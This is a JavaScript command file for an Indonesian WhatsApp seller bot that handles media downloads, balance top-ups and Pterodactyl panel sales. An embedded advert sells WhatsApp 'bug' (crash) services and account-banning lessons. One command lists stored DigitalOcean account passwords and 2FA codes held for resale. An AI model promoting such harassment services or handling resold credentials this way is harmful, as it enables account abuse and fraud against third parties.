const KenzSaldo = ` ${toRupiah(cekSaldo(m.sender, db_saldo))}`
const example = (teks) => {
return `\n *Contoh Penggunaan :*\n Ketik *${prefix+command}* ${teks}\n`
}
function monospace(string) {
return '```' + string + '```'
}
function monospa(string) {
return '`' + string + '`'
}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomNomor(min, max = null){
if (max !== null) {
min = Math.ceil(min);
max = Math.floor(max);
return Math.floor(Math.random() * (max - min + 1)) + min;
} else {
return Math.floor(Math.random() * min) + 1
}
}//mmek
const Reply = async (teks) => {
return Kenz.sendMessage(m.chat, {text: teks, mentions: [m.sender], contextInfo: {
isForwarded: true, 
forwardingScore: 9999, 
businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: `${botname}`, newsletterJid: global.idSaluran }, 
externalAdReply: {
title: botname, 
body: `© Powered By ${namaOwner}`, 
thumbnailUrl: global.image.reply, 
sourceUrl: null, 
}}}, {quoted: qkontak})
}

const slideButton = async (jid, mention = []) => {
let imgsc = await prepareWAMessageMedia({ image: { url: global.image.logo }}, { upload: Kenz.waUploadToServer })
const msgii = await generateWAMessageFromContent(jid, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `*All Transaksi Open ✅*\n\n*${global.nameHost}* Menyediakan Produk & Jasa Dibawah Ini ⬇️`
}), 
contextInfo: {
mentionedJid: mention
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*Masuk Sinii Kak Bebas Promosi*

* *chat.whatsapp.com/BEAWNlvQDt5KcFJ6pzQAn2*

* *chat.whatsapp.com/BEAWNlvQDt5KcFJ6pzQAn2*

*#- Ready Panel Private & Public*

*- Panel Public 1Gb - Unli* 
*- Panel Private 1Gb - Unli*
*- Reseller Panel 5k*
*- Admin Panel 10k*
*- Partner Panel  15k*
*- Owner Panel  25k*
*[ ! ] Only Bulanan, permanen? +5k aja*
> *Nego? Bolehh Asal 🧠🧠*

*>> Produk Lainnya? <<*
*» Aplikasi Premium, YouTube, Spotify,Dll*
*» Script Bot Tele/WhatsApp*
*» Script Bug Starevxz*
*»  Sewa Bot WhatsApp, pushkontak, group, bug*
*»  Domain my.id web.id biz.id*
*»  Apitoken & Zone Domain*
*»  Jasa Rename Script*
*»  Jasa Suntik Sosmed*
*»  Jasa Install Panel*
*»  Jasa Install Thema*
*»  Jasa Bug*
*»  Murid Unband*
*»  Murid Banned*
*»  Murid Nokos*
*»  Murid Suntik*
*Dll Tanyakan saja*
> Produk Lainnya Tanyakan Saja 90% Ada


*☎️ Contact Kenz - OfficiaL*
*🪀 WhatsApp :* +6285183671661
*🎮 Telegram :* @KenzKenzboys
*🀄 Web Store :* linktr.ee/Kenzoffc
▬▭▬▭▬▭▬▭▬▭▬▭▬
*🎴 Testimoni :*
 *- whatsapp.com/channel/0029VazCNdQDuMRkjf65cx1F*
*🌀 Group Bebas Promosi :*
*- chat.whatsapp.com/BEAWNlvQDt5KcFJ6pzQAn2*
> © 𝐊𝐞𝐞𝐥 𝐢𝐬 𝐇𝐞𝐫𝐞 💦`, 
hasMediaAttachment: true,
...imgsc
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Panel Run Bot Private 🌟*

* Ram 1GB : Rp1000
* Ram 2 GB : Rp2000
* Ram 3 GB : Rp3000
* Ram 4 GB : Rp4000
* Ram 5 GB : Rp5000
* Ram 6 GB : Rp6000
* Ram 7 GB : Rp7000
* Ram 8 GB : Rp8000
* Ram 9 GB : Rp9000
* Ram Unlimited : Rp10.000

*Syarat & Ketentuan :*
* _Server private & kualitas terbaik!_
* _Script bot dijamin aman (anti drama/maling)_
* _Garansi 10 hari (1x replace)_
* _Server anti delay/lemot!_
* _Claim garansi wajib bawa bukti transaksi_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*List Vps Digital Ocean🌟*

_*Promo Vps Digital Ocean*_
* Ram 2 Core 2 Rp 25.000
* Ram 4 Core 2 Rp 35.000
* Ram 8 Core 4 Rp 45.000
* Ram 16 Core 4 Rp 60.000
𝘽𝙚𝙣𝙚𝙛𝙞𝙩
>̶>̶ Free Install Panel Pterodactyl
>̶>̶ Free Install Nodes+Wings
>̶>̶ Free Req domain
>̶>̶ Free Req Os, Versi, Region
>̶>̶ Full Akses Vps
>̶>̶ Masa Aktif 30 Hari Garansi 25 Hari
>̶>̶ Free Install Thema 8-16 Ram`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Chat Penjual\",\"url\":\"${global.linkOwner}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qlocJpm})
await Kenz.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
}
//btas
const pluginsLoader = async (directory) => {
let plugins = []
const folders = fs.readdirSync(directory)
folders.forEach(file => {
const filePath = path.join(directory, file)
if (filePath.endsWith(".js")) {
try {
const resolvedPath = require.resolve(filePath);
if (require.cache[resolvedPath]) {
delete require.cache[resolvedPath]
}
const plugin = require(filePath)
plugins.push(plugin)
} catch (error) {
console.log(`Error loading plugin at ${filePath}:`, error)
}}
})
return plugins
}


//========= [ COMMANDS PLUGINS ] =================================================
let pluginsDisable = true
const plugins = await pluginsLoader(path.resolve(__dirname, "plugins"))
const skyzodev = { Kenz, toIDR, isCreator, Reply, command, isPremium, capital, isCmd, example, text, runtime, qtext, qlocJpm, qmsg, mime, sleep, botNumber, nomore, qkontak, KenzSaldo, Kenzganteng, prefix, reply, text, pickRandom, readmore, fetchJson, salam, totalfitur, ppuser, fsaluran, makeid}
for (let plugin of plugins) {
if (plugin.command.find(e => e == command.toLowerCase())) {
pluginsDisable = false
if (typeof plugin !== "function") return
await plugin(m, skyzodev)
}
}
if (!pluginsDisable) return

//============= [ COMMANDS ] ====================================================

switch (command) {
case "play2": {
if (!text) return m.reply(example("dj tiktok"))
await Kenz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytdl.ytmp3(`${res.url}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Kenz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363314209665405@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${res.title}`,
newsletterJid: `${global.idSaluran}`}
}},{quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Kenz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
//Kenz si pler 🐎
break 
        //wm Kenz
        case "qc": {
if (!text) return m.reply(example('teksnya'))
let warna = ["#000000", "#000000"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]

const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": reswarna,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": m.pushName,
 "photo": {
 "url": ppuser
 }
 },
 "text": text,
 "replyMessage": {}
 }
 ]
};
 const response = axios.post('https://bot.lyo.su/quote/generate', json, {
 headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
 const buffer = Buffer.from(res.data.result.image, 'base64')
 let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
//await Kenz.sendStimg(m.chat, tempnya, m, {packname: author})
await Kenz.sendAsSticker(m.chat, tempnya, m, {packname: global.packname})
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
       
			
case 'acc': case 'addsaldo':{
if (!isCreator) return Reply(`*[ System Notice ]* User tidak bisa aksess command ini`)
const Kalender000 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
if (!q.split(",")[0]) return Reply(`Ex : ${prefix+command} ${nomore},20000`)
if (!q.split(",")[1]) return Reply(`Ex : ${prefix+command} ${nomore},2000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
await sleep(1000)
Reply(`*USER SALDO*
 • ID : ${sender.split("@")[0]}
 • Nomor : ${q.split(",")[0]}
 • Tanggal : ${Kalender000}
 • Saldo : Rp ${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))} `)
 }
case 'kirim': {
if (!isCreator) return Reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
let messageText = `Operasi *Topup* sebanyak Rp. ${q.split(",")[1]} suksess, ketik *.saldo* untuk melihat info anda`
let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

Kenz.sendMessage(targetNumber, {
text: `${messageText}`,
mentions: [sender]
}, {
quoted: m
}).then(() => {
Reply('Berhasil ✓');
}).catch(() => {
m.reply('Gagal mengirim pesan!');
});
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delstok": case "delstokdo": case "deldo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
if (text == "all") {
await stokdo.splice(0, stokdo.length)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
return m.reply(`Berhasil menghapus semua stok data akun digitalocean ✅`)
}
if (!text || isNaN(text)) return m.reply(example("idnya\n\nKetik *.liststok* untuk lihat id"))
if (Number(text) > stokdo.length) return m.reply("Id stok tidak ditemukan")
let inx = Number(text) - 1
stokdo.splice(inx, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await m.reply("Berhasil menghapus data stok digitalocean ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "liststok": case "liststokdo": case "listdo": {
if (!isCreator) return Reply(mess.owner)
if (stokdo.length < 1) return m.reply("Tidak ada stok")
//if (m.isGroup) return Reply(mess.private)
let messageText = "\n *List All Stok Digital Ocean*\n"
let count = 0
for (let res of stokdo) {
messageText += `\n*ID Stok :* ${count += 1}
*Email :* ${res.email}
*Password :* ${res.password}
*Kode 2FA :* ${res.kode2fa}
*Referall :* ${res.referall}
*Harga :* Rp${await toIDR(res.harga.toString())}
*Droplet :* ${res.droplet}\n`
}
return m.reply(messageText)
}
break

    case "listcase": {
    if (!isCreator) {
        return reply(mess.owner);
    }

    const listCases = () => {
        const filePath = './fitur.js';

        try {
            // Baca isi file
            let fileContent = fs.readFileSync(filePath, 'utf-8');

            // Cari semua case menggunakan regex
            const caseRegex = /case\s+['"](.+?)['"]\s*:/g;
            let matches;
            let cases = [];

            while ((matches = caseRegex.exec(fileContent)) !== null) {
                cases.push(matches[1]);
            }

            if (cases.length === 0) {
                return "Tidak ada case yang ditemukan.";
            }

            // Format daftar case
            return `*🌀Daftar Case yg Tersedia*\n\n${cases.map((c, i) => `${i + 1}. ${c}`).join('\n')}`;
        } catch (error) {
            throw new Error(`Terjadi kesalahan saat membaca file: ${error.message}`);
        }
    };

    try {
        const result = listCases();
        reply(result);
    } catch (e) {
        reply(`Gagal menampilkan daftar case: ${e.message}`);
    }
    }
    break;
    

case 'mediafire':{
  if (!text) return reply(`*Example:* ${prefix} mediafire https://www.mediafire.com`);
    
    try {
        const response = await fetch(`https://restapi.apibotwa.biz.id/api/mediafire?url=${encodeURIComponent(text)}`);
        const json = await response.json();
        
        if (!json.data.response) return reply('Failed to fetch!');
        
        const { download, filename, size, type, uploaded, mimetype } = json.data.response;
        
        let caption = `
*💌 Name:* ${filename}
*📊 Size:* ${size}
*🗂️ Extension:* ${type}
*📨 Uploaded:* ${uploaded}
`.trim();
        
        m.reply(caption);
       
    await Kenz.sendMessage(m.chat, { document: { url: download }, mimetype: mimetype || "application/octet-stream", fileName: filename }, { quoted: m });
        
    } catch (error) {
        throw error
    }
};
break
//================================================================================
case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Kenz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await ytdl.ytmp3(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Kenz.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Kenz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================
 case "brat": {
    if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
    if (text.length > 100) return m.reply(`Karakter terbatas, max 100!`);

    let caption = "Silahkan Pilih Di Bawah Ini:";
    return Kenz.sendMessage(m.chat, {
        text: caption,
        footer: `\n© ${botname}`,
        buttons: [
            { buttonId: `.bratgambar ${text}`, buttonText: { displayText: "Gambar" }, type: 1 },
            { buttonId: `.bratvideo ${text}`, buttonText: { displayText: "Video" }, type: 1 }
        ],
        viewOnce: true
    });
}
break;
case "bratgambar": {
    if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
    if (text.length > 100) return m.reply(`Karakter terbatas, max 100!`);

    try {
        const res = await axios.get(`https://restapi-v2.simplebot.my.id/imagecreator/brat?text=${text}`, { responseType: "arraybuffer" });
        if (res.status !== 200) throw new Error("Gagal mengambil gambar.");

        let buffer = Buffer.from(res.data);

        // Kirim sebagai stiker gambar
        await Kenz.sendMessage(m.chat, { sticker: buffer });

    } catch (err) {
        m.reply("Terjadi kesalahan saat membuat stiker.");
    }
}
break;

case "bratvideo": {
    if (!text) return m.reply(`Contoh : ${prefix + command} Hai kak`);
    if (text.length > 100) return m.reply(`Karakter terbatas, max 100!`);

    let tempDir = path.join(process.cwd(), "temp");
    if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);

    let framePaths = [];

    try {
        // Generate setiap kata sebagai frame
        const words = text.split(" ");
        for (let i = 0; i < words.length; i++) {
            let currentText = words.slice(0, i + 1).join(" ");
            let res = await axios.get(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`, { responseType: "arraybuffer" });

            if (res.status !== 200) throw new Error("Gagal mengambil frame dari API.");

            let framePath = path.join(tempDir, `frame${i}.jpg`);
            fs.writeFileSync(framePath, res.data);
            framePaths.push(framePath);
        }

        // Buat daftar file untuk ffmpeg
        const fileListPath = path.join(tempDir, "filelist.txt");
        let fileListContent = framePaths.map(frame => `file '${frame}'\nduration 0.7`).join("\n");
        fs.writeFileSync(fileListPath, fileListContent);

        // Proses video dengan ffmpeg
        const outputVideoPath = path.join(tempDir, "output.mp4");
        execSync(`ffmpeg -y -f concat -safe 0 -i "${fileListPath}" -vf "fps=30,scale=512:512:flags=lanczos" -c:v libwebp -loop 0 -preset default -an "${outputVideoPath}"`);

        // Kirim sebagai stiker animasi
        await Kenz.sendMessage(m.chat, { sticker: { url: `file://${outputVideoPath}` } });

    } catch (e) {
        console.error(e);
        m.reply(`Terjadi kesalahan: ${e.message}`);
    } finally {
        // Hapus file sementara
        framePaths.forEach(frame => fs.existsSync(frame) && fs.unlinkSync(frame));
        fs.existsSync(fileListPath) && fs.unlinkSync(fileListPath);
        fs.existsSync(outputVideoPath) && fs.unlinkSync(outputVideoPath);
    }
}
break;



case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await Kenz.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
var anu = await ytdl.ytmp4(`${text}`)

if (anu.status) {
let urlMp3 = anu.download.url
await Kenz.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await Kenz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case"pin-Kenz": case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await Kenz.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: Kenz.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Kenz.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await Kenz.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case 'play':
			case 'ytplay': {
if (!text) return m.reply(example("Kenz berak di celana"))
await Kenz.sendMessage(`${global.idSaluran}`, {react: {text: '🔎', key: m.key}})
let ytsSearchh = await yts(text)
const rees = await ytsSearchh.all[0]
				const caption = `${rees.title}\n${rees.url}`;
				Kenz.sendMessage(m.chat,{
			        image: {url:rees.thumbnail},
                   //thumbnailUrl: rees.thumbnail,
                   //renderLargerThumbnail: true,
					caption: caption,
					footer: `Author ${rees.author.name} || Duration ${rees.timestamp}\n${botname2}`,
					buttons: [
						{
							buttonId: `.ytmp4 ${rees.url}`,
							buttonText: {
								displayText: "get video"
							}
						},
						{
							buttonId: `.ytmp3 ${rees.url}`,
							buttonText: {
								displayText: "get audio"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			//Kenz si pler 🐎
break 

case 'menu-panelv1':{
				let timestampe = speed();
				let latensie = speed() - timestampe;
				let a = db.users[m.sender];
				let me = m.sender;
				let hehe = ``;
				let msg = generateWAMessageFromContent(m.chat, {
					viewOnceMessage: {
						message: {
							"messageContextInfo": {
								"deviceListMetadata": {},
								"deviceListMetadataVersion": 2
							},
							interactiveMessage: proto.Message.InteractiveMessage.create({
								body: proto.Message.InteractiveMessage.Body.create({
									text: hehe
								}),
								footer: proto.Message.InteractiveMessage.Footer.create({
									text: ''
								}),
								header: proto.Message.InteractiveMessage.Header.create({
									...(await prepareWAMessageMedia({ image: global.pathimg }, { upload: Kenz.waUploadToServer })), 
									title: 'pilih sesuai kebutuhan',
									subtitle: 'muka lu kek kontol🗿',
									hasMediaAttachment: true 
								}),
								nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
									buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "Please select", 
 sections: [{
 highlight_label: "Pupuler Sepanjang Masa",
 rows: [{
 header: 'Add Reseller',
 title: "Menampilkan Fitur Add Reseller",
 description: `© Kenz-Satoru`,
 id: `.addseller`
  }]}, {
 highlight_label: "",
 rows: [{
 header: 'Dellete Reseller',
 title: "menampilkan Fitur Dellete Reseller",
  description: `© Kenz-Satoru`,
 id: `.dellseller`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'List Reseller',
 title: "menampilkan Semua Reseller",
  description: `© Kenz-Satoru`,
 id: `.listseller`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Create Admin',
 title: "menampilkan Fitur Membuat Admin Panel",
  description: `© Kenz-Satoru`,
 id: `.cadmin`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'List Admin Panel',
 title: "Menampilkan Semua Admin Panel",
  description: `© Kenz-Satoru`,
 id: `.listadmin`
 }]}, {
 highlight_label: "",
 rows: [{
 header: 'Dellete Admin',
 title: "Menampilkan Fitur Hapus Admin Panel",
  description: `© Kenz-Satoru`,
 id: `.deladmin`
 }]},{
 highlight_label: "",
 rows: [{
 header: 'Create Panel',
 title: "menampilkan Fitur Membuat Panel",
  description: `© Kenz-Satoru`,
 id: `.cpanel`
  }]}, {
 highlight_label: "",
 rows: [{
 header: 'Membuat Panel Per Gb',
   title: "Menampilkan Fitur Panel 1gb - Unli",
  description: `© Kenz-Satoru`,
 id: `.panelgb`
 }]
 }]
 })
}
									],
								}),
								contextInfo: {
									mentionedJid: [m.sender], 
									forwardingScore: 1,
									isForwarded: true,
									forwardedNewsletterMessageInfo: {
										newsletterJid: idSaluran,
										newsletterName: "List Menu Panel Versi 1",
										serverMessageId: 143
									}
								}
							})
						}
					}
				}, { quoted: m })

				await Kenz.relayMessage(msg.key.remoteJid, msg.message, {messageId: msg.key.id})
			}
			//Kenz si pler 🐎
break
case "buyadminpanel": {
if (m.isGroup) return m.reply("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) return m.reply(example("username"))
if (text.includes(" ")) return m.reply("Username tidak boleh memakai spasi!")
let us = crypto.randomBytes(2).toString('hex')
let Obj = {}
Obj.harga = "500" 
Obj.username = text.toLowerCase() + us
const UrlQr = global.qrisOrderKuota


const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://apii-Kenz.vercel.app/orderkuota/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${global.qrisOrderKuota}`);
const formattedTime = `${hours}:${minutes}`;
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
  *• ID :* ${get.data.result.idtransaksi}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Kenz.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://apii-Kenz.vercel.app/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
const formattedTime = `${hours}:${minutes}`;
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :*  ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": "admin",
"first_name": "John",
"last_name": "Doe",
"root_admin": true,
"language": "en",
"password": password.toString()    
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID User :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domain}
* *Expired :* 1 Bulan

*Rules Admin Panel ⚠️*
* Jangan Maling SC, Ketahuan Maling ? Auto Delete Akun & No Reff!!
* Simpan Baik² Data Akun Ini
* Buat Panel Seperlunya Aja, Jangan Asal Buat!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Kenz.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: null})
await Kenz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case 'ttsewrch': case 'tiktoksearch': case 'tts': {
function tiktoks(query) {
  return new Promise(async (resolve, reject) => {
    try {
      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/feed/search',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: {
          keywords: query,
          count: 50,
          cursor: 0,
          HD: 1
        }
      });
      const videos = response.data.data.videos;
      if (videos.length === 0) {
        reject("Tidak ada video ditemukan.");
      } else {
        const gywee = Math.floor(Math.random() * videos.length);
        const videorndm = videos[gywee]; 

        const result = {
          title: videorndm.title,
          cover: videorndm.cover,
          origin_cover: videorndm.origin_cover,
          no_watermark: videorndm.play,
          watermark: videorndm.wmplay,
          music: videorndm.music
        };
        resolve(result);
      }
    } catch (error) {
      reject(error);
    }
  });
}

  if (!text) return reply(`• *Example :* .${command} judul vidio`, m)
  Kenz.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
    let caption = '```Result from:```'+' `'+text+'`'
  let Kenz = await tiktoks(`${text}`)
/*Kenz.sendMessage(m.chat, {
  video: {url: Kenz.no_watermark},
  gifPlayback: false, 
  caption: '```Result from:```'+' `'+text+'`'
  }, {quoted: m})*/
  Kenz.sendMessage(m.chat,{
			 video: {url:Kenz.no_watermark},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: caption,
					footer: `\n${botname2}`,
					buttons: [
						{
							buttonId: `.ttmp3 ${Kenz.no_watermark}`,
							buttonText: {
								displayText: "back sound"
							}
						},
					],
					viewOnce: true,
				}, {
					quoted: m
				});

}
//Kenz si pler 🐎
break 

case 'ceksaldo':
if (!froms) return Reply(`Mau cek saldo siapa? coba reply atau tag 🤔`)
if (froms == global.owner || froms == botNumber) return Reply(`Ups, Saldo ${froms == global.owner ? 'creator saya' : 'bot'} Privasi!`)
if (db.users[froms] == undefined) return Reply('User tidak terdaftar didalam database!')
if (froms == sender) return Reply('Ketik aja saldo lah')
Reply(`*INFO SALDO DARI*\n\nTarget Cek : ${Kenz.getName(froms)}\nSaldo : Rp. ${toRupiah(cekSaldo(froms, db_saldo))}\nNomor : ${froms.split('@')[0]}`)
break
case 'saldo':{
const Kalender0001 = moment.tz('Asia/Jakarta').format(`yyyy-MMMM-dddd`)
Reply(`*INFO SALDO ANDA*

 • Name : ${pushname}
 • Nomor : ${m.sender.split("@")[0]}
 • Saldo : Rp ${toRupiah(cekSaldo(m.sender, db_saldo))}
 • Tanggal : ${calender}
 
Note : anda hanya bisa melakukan pembelian di bot Kenz saja, ketik *.shop menu* untuk berbelanja`)
}
break

case 'minsaldo':
if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`)
if (!q.split(",")[0]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return m.reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
